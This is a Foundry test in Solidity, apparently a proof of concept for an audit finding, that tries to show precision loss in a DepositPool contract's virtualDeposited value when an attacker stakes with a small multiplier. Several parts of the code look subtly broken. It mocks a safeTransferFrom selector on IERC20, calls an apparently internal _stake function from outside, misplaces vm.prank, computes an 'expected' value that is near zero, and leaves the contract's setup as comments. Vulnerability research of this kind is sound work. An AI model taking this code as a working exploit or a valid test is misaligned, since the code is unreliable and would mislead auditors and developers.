// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./DepositPool.sol"; // Assuming the DepositPool contract is available

contract ExploitTest is Test {
    DepositPool depositPool;
    address attacker = address(0x1);
    address depositToken = address(0x2);
    address distributor = address(0x3);
    uint256 rewardPoolIndex = 0;
    uint256 initialBalance = 1000 ether;
    uint256 precision = 1e18;

    function setUp() public {
        // Deploy the DepositPool contract
        depositPool = new DepositPool();

        // Fund the attacker with initial balance
        vm.deal(attacker, initialBalance);

        // Set up the deposit token and distributor
        vm.etch(depositToken, new bytes(0x20)); // Mocking the token contract
        vm.etch(distributor, new bytes(0x20)); // Mocking the distributor contract

        // Assume necessary initializations for the depositPool
        // e.g., setting the distributor, depositToken, etc.
    }

    function test_exploit() public {
        // Step 1: Attacker stakes a small amount with a small multiplier
        uint256 stakeAmount = 1 ether;
        uint256 smallMultiplier = 1; // Simulating a small multiplier
        uint256 claimLockEnd = uint128(block.timestamp + 1 days);

        // Impersonate the attacker
        vm.prank(attacker);

        // Mock the necessary external calls
        vm.mockCall(depositToken, abi.encodeWithSelector(IERC20(depositToken).balanceOf.selector, address(this)), abi.encode(initialBalance));
        vm.mockCall(depositToken, abi.encodeWithSelector(IERC20(depositToken).safeTransferFrom.selector, attacker, address(this), stakeAmount), abi.encode(true));
        vm.mockCall(distributor, abi.encodeWithSelector(IDistributor(distributor).supply.selector, rewardPoolIndex, stakeAmount), abi.encode(true));

        // Stake the amount
        depositPool._stake(attacker, rewardPoolIndex, stakeAmount, 0, claimLockEnd, address(0));

        // Step 2: Calculate expected virtualDeposited with correct precision
        uint256 expectedVirtualDeposited = (stakeAmount * smallMultiplier) / precision;

        // Step 3: Assert the precision loss in virtualDeposited calculation
        uint256 actualVirtualDeposited = depositPool.getUserData(attacker, rewardPoolIndex).virtualDeposited;
        assertEq(actualVirtualDeposited, expectedVirtualDeposited, "Precision loss in virtualDeposited calculation");
    }
}